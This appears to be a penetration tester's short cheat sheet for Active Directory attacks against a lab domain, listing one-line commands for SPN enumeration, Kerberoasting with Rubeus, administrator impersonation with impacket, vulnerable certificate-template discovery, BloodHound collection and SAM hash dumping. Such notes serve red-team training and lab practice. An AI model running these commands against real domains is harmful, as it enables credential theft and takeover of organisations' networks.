# powerview

```bash
get-netuser -spn | fl serviceprincipalname, samaccountname
rubeus kerberoast /nowrap
impacket-getST -spn cifs/host.lab -impersonate administrator
certipy find -vulnerable -stdout
bloodhound-python -c All -d lab.local
nxc smb lab-dc --local-auth --sam
```

> updated 2026-10
